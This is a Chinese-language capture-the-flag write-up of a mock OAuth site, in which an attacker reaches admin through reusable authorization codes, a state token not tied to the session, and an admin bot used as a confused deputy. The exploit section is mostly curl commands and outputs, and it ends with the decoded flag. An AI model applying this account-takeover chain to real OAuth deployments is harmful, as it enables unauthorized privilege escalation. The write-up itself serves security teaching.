#### 1. 信息收集

访问首页即可看到 Mock OAuth 演示站，源码注释里留了两处「开发者遗留备注」：

实测：

|  |  |  |
| --- | --- | --- |
| 路径 | 结果 | 说明 |
| GET /admin/note | 管理员初始化密码：Admin@2026! | 诱饵。用 admin / Admin / administrator + 该密码登录全部 bad credential |
| GET /backup/flag.txt | 404 not found | 诱饵 |
| GET /flag（未登录 / 普通用户） | {"msg":"forbidden"} | 需要管理员权限 |
| GET /profile（未登录） | {"msg":"not logged in"} | Session 校验存在 |
| GET /docs | Swagger UI | 暴露全部路由 |

从 /openapi.json 抽出关键接口：

POST /register
POST /login
GET  /profile
GET  /bind/start                 # 发起 OAuth 绑定，登录后 302 到授权地址
GET  /mock\_oauth/authorize       # 模拟授权端点，302 回 callback 并带 code/state
POST /mock\_oauth/token           # 模拟换票
GET  /bind/callback?code&state   # 处理回调、完成绑定
GET  /admin/visit?url=           # 管理员 Bot 携带固定管理员会话访问本机 URL
GET  /flag                       # 管理员可读

/admin/visit 的官方描述已经把攻击面写在纸上了：

·模拟管理员浏览器点击链接（携带固定管理员会话）

·只允许访问本机 http/https，防止被当成外网 SSRF

·不跟随重定向

·响应体不回传（所以不能直接让 Bot 去访问 /flag 再把内容带出来）

结论：Bot 不能直接把 flag 读回来，但可以让管理员「替我们点一次绑定回调」。

#### 2. 正常绑定流程

1.注册并登录普通用户，获得 session\_id Cookie

2.GET /bind/start（登录态）返回 302：

Location: /mock\_oauth/authorize?client\_id=test&redirect\_uri=%2Fbind%2Fcallback&state=

3.跟随到 /mock\_oauth/authorize，再 302：

Location: /bind/callback?code=mock\_code\_xxxxxxxx&state=

4./bind/callback 用当前会话完成绑定，当前用户就拥有了这份 OAuth identity。

state 并不是裸 JWT，而是 Base64(JWT)。解一层 Base64 后：

// header
{"alg":"HS256","typ":"JWT"}

// payload
{"aud":"oauth:state","exp":1789294607}

state 只校验签名、audience=`oauth:state 和过期时间，\*\*没有绑定到发起绑定的那个 session / uid\*\*。 谁拿着合法的 code + state` 去访问 callback，谁就能触发绑定逻辑。

另外：授权码 mock\_code\_\*可以重复兑换，第一次消费后并不会作废。

#### 3. 漏洞原理

题目把三件不该同时出现的事情叠在一起：

##### 3.1 Authorization Code 可复用

OAuth2 规范要求授权码一次性使用。这里同一组 code + state 可以被 /bind/callback 成功处理两次。

##### 3.2 已绑定身份会「切换当前会话」

/bind/callback 的逻辑类似于：

用 code 向 Mock IdP 换出 identity
if identity 尚未绑定:
    绑定到「当前请求的 session 用户」
else:
    # 身份已经有主人了
    把当前 session 直接切换成主人账号
    返回 "identity owned by admin, session switched"

Cookie 值本身不变，但服务端 session 记录被改写成 admin。随后 /profile 就会变成：

{"user":"admin","role":"admin"}

##### 3.3 管理员 Bot 是 Confused Deputy

/admin/visit?url= 会用内置管理员会话去请求本机 URL。只要把 url 指到 /bind/callback?code=...&state=...，管理员就会「先绑上」这份 OAuth 身份。

攻击者再拿同一组 code + state 访问 callback，就会走「身份已有主人 → 切换会话」分支，当前普通用户 session 升级为 admin。

整条链是经典的：

授权码注入 / OAuth 绑定劫持 + 管理员 CSRF Bot

#### 4. 利用步骤

关键点：/bind/start 和 /mock\_oauth/authorize 都是 302。必须 allow\_redirects=False（curl -D - / 不跟随跳转），否则浏览器或 requests 会自己走完 callback，身份先绑到你自己身上，劫持窗口就没了。

##### 4.1 注册并登录普通用户

curl -k -c cookie.txt -X POST \
  'https://TARGET:8000/register' \
  -d 'username=attacker&password=Passw0rd!'

curl -k -c cookie.txt -b cookie.txt -X POST \
  'https://TARGET:8000/login' \
  -d 'username=attacker&password=Passw0rd!'

GET /profile 此时是：

{"user":"attacker","role":"user"}

##### 4.2 取 state（不要跟随 302）

curl -k -b cookie.txt -D - -o /dev/null \
  'https://TARGET:8000/bind/start'

响应类似：

HTTP/1.1 302
Location: /mock\_oauth/authorize?client\_id=test&redirect\_uri=%2Fbind%2Fcallback&state=ZXlK...

记下 state。

##### 4.3 取 code（仍然不要跟随 302）

curl -k -b cookie.txt -D - -o /dev/null \
  'https://TARGET:8000/mock\_oauth/authorize?client\_id=test&redirect\_uri=%2Fbind%2Fcallback&state=STATE'

响应类似：

HTTP/1.1 302
Location: /bind/callback?code=mock\_code\_409c6377088e5820&state=STATE

记下 code。到这一步 不要自己访问 callback。

##### 4.4 让管理员 Bot 先绑定这份身份

url 必须指向容器内部地址（Bot 跑在 127.0.0.1:8000），查询串要整体 URL 编码，避免 code/state 被吃进外层参数。

curl -k -G 'https://TARGET:8000/admin/visit' \
  --data-urlencode 'url=http://127.0.0.1:8000/bind/callback?code=mock\_code\_409c6377088e5820&state=STATE'

返回：

{"status":"bot visited"}

此时这份 OAuth identity 的主人已经是 admin。

##### 4.5 用同一组 code + state 完成劫持

curl -k -b cookie.txt \
  'https://TARGET:8000/bind/callback?code=mock\_code\_409c6377088e5820&state=STATE'

返回：

{"msg":"identity owned by admin, session switched","user":"admin"}

再看资料：

curl -k -b cookie.txt 'https://TARGET:8000/profile'
# {"user":"admin","role":"admin"}

curl -k -b cookie.txt 'https://TARGET:8000/flag'
# {"flag":"ZmxhZ3szNDVkYmMwMi1kZWUwLTQ4OTgtYmJmZS1hYmI1MTEzNDU4MzJ9"}

/flag 给的是 Base64，解码：

echo 'ZmxhZ3szNDVkYmMwMi1kZWUwLTQ4OTgtYmJmZS1hYmI1MTEzNDU4MzJ9' | base64 -d
# flag{345dbc02-dee0-4898-bbfe-abb511345832}
